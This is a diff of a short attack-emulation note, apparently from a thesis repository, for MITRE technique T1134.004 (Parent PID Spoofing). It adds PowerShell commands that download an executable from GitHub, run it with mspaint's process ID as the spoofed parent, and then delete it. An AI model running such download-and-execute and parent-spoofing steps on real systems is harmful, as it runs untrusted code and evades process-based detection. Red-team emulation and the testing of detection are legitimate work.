@@ -1,8 +1,8 @@
-
-PARA COMPILAR EL PROGRAMA:
-En visual studio en equipo windows10, es necesario compilar la versoin Realease x64, y cambiar la opcion "Biblioteca en tiempo de ejecución" que viene con el valor "DLL Multiproceso (/MD)" al valor "Multiproceso (/MT)"
+Access Token Manipulation: Parent PID Spoofing    T1134.004
 
 
+POWERSHELL
+----------------------------------------------------
 mspaint
 Invoke-WebRequest -Uri https://github.com/PaulaMerino/TFM/raw/main/exec/parentPIDSpoofing.exe -OutFile "$env:USERPROFILE\Downloads\parentPIDSpoofing.exe"
 & "$env:USERPROFILE\Downloads\parentPIDSpoofing.exe" (Get-Process | ?{$_.ProcessName -eq "mspaint"} | Select-Object -ExpandProperty Id)
@@ -10,3 +10,6 @@ Invoke-WebRequest -Uri https://github.com/PaulaMerino/TFM/raw/main/exec/parentPI
 
 CLEAN UP
 Remove-Item "$env:USERPROFILE\Downloads\parentPIDSpoofing.exe"
+----------------------------------------------------
+
+
